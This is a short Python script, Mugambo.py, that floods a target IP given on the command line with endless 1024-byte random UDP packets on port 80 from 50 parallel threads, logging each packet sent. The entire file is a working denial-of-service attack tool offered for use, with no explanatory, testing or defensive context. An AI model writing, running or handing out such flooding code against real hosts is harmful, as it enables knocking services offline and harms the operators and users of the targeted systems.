# Mugambo.py
import socket
import random
import threading
import time
import sys

target_ip = sys.argv[1]
target_port = 80
thread_count = 50

def udp_flood():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (target_ip, target_port))

            with open("udp_log.txt", "a") as log:
                log.write(f"[{time.ctime()}] Sent UDP packet to {target_ip}:{target_port}\n")

            print(f"[+] Packet sent to {target_ip}")
        except Exception as e:
            print(f"[!] Error: {e}")

for i in range(thread_count):
    thread = threading.Thread(target=udp_flood)
    thread.daemon = True
    thread.start()

print(f"[INFO] UDP flood started on {target_ip}:{target_port} with {thread_count} threads.")
while True:
    time.sleep(1)
